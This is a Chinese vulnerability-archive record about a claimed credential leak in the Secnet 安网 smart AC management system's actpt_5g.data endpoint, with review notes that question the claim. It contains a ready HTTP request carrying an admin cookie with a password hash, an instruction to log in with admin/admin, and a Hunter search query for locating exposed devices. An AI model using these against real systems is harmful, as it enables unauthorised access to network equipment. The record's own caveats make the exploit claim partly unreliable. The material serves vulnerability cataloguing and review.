---
source: "wy876 漏洞文库"
title: "Secnet安网智能AC管理系统 actpt_5g.data信息泄露声称"
product: "Secnet安网智能AC管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "型号/固件未知"
prerequisites: "样例携带admin账号与密码哈希Cookie"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gaq5fqcqle5ez69e"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Secnet%E5%AE%89%E7%BD%91/Secnet%E5%AE%89%E7%BD%91%E6%99%BA%E8%83%BDAC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Factpt_5g%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md"
fofa_unverified: "web.title="
hunter: "web.title=\"安网-智能路由系统\""
id: "vw-808a6e06b4bb69ccfa2ebedc"
entity_id: "ve-808a6e06b4bb69ccfa2ebedc"
schema_version: "1"
---

# Secnet安网智能AC管理系统 actpt_5g.data信息泄露声称

## 条目说明

- 对象与具体问题：Secnet安网智能AC管理系统；actpt_5g.data信息泄露声称
- 版本、配置及部署条件：型号/固件未知
- 认证与权限前提：样例携带admin账号与密码哈希Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 请求已带认证Cookie，不能据此认定未认证泄露
- 无响应字段展示，admin/admin是样例账号或默认凭据，来源不能证明由此接口获取
- Hunter字段混入fofa且残缺
- 区分设备管理口令与无线AP配置密码，需补数据结构及修复固件

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
Secnet安网 智能AC管理系统 actpt_5g 接口存在信息泄露漏洞，可获取用户密码信息。

## 二、影响版本
+ Secnet安网 智能AC管理系统 

## 三、资产测绘
+ hunter`web.title="安网-智能路由系统"`
+ 特征


## 四、漏洞复现
```http
GET /actpt_5g.data HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ac_userid=admin,ac_passwd=70076EA6CDE654631A639018D9E23BC5
Upgrade-Insecure-Requests: 1
```

使用泄露的账号密码`admin/admin`登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gaq5fqcqle5ez69e>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
